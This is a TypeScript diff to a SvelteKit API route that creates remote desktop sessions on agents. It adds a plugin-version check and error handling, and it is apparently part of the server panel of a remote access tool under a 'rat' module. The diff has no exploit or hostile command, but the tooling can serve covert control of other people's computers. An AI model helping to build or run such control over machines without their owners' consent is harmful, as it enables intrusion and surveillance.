@@ -2,7 +2,12 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { registry, RegistryError } from '$lib/server/rat/store';
 import { requireOperator, requireViewer } from '$lib/server/authorization';
-import { remoteDesktopManager, RemoteDesktopError } from '$lib/server/rat/remote-desktop';
+import {
+        remoteDesktopManager,
+        RemoteDesktopError,
+        remoteDesktopEnginePluginId,
+        requiredRemoteDesktopPluginVersion
+} from '$lib/server/rat/remote-desktop';
 import type {
 	RemoteDesktopSessionResponse,
 	RemoteDesktopSettings,
@@ -69,12 +74,18 @@ export const POST: RequestHandler = async ({ params, request, locals }) => {
 		body = {};
 	}
 
-	try {
-		const settings = normalizeSettings(body);
-		const session = remoteDesktopManager.createSession(id, settings);
+        try {
+                await registry.requireAgentPluginVersion(
+                        id,
+                        remoteDesktopEnginePluginId,
+                        requiredRemoteDesktopPluginVersion
+                );
 
-		try {
-			const payload: RemoteDesktopCommandPayload = {
+                const settings = normalizeSettings(body);
+                const session = remoteDesktopManager.createSession(id, settings);
+
+                try {
+                        const payload: RemoteDesktopCommandPayload = {
 				action: 'start',
 				sessionId: session.sessionId,
 				settings: session.settings
@@ -89,12 +100,15 @@ export const POST: RequestHandler = async ({ params, request, locals }) => {
 		}
 
 		return json({ session } satisfies RemoteDesktopSessionResponse, { status: 201 });
-	} catch (err) {
-		if (err instanceof RemoteDesktopError) {
-			throw error(err.status, err.message);
-		}
-		throw error(500, 'Failed to create remote desktop session');
-	}
+        } catch (err) {
+                if (err instanceof RemoteDesktopError) {
+                        throw error(err.status, err.message);
+                }
+                if (err instanceof RegistryError) {
+                        throw error(err.status, err.message);
+                }
+                throw error(500, 'Failed to create remote desktop session');
+        }
 };
 
 export const PATCH: RequestHandler = async ({ params, request, locals }) => {
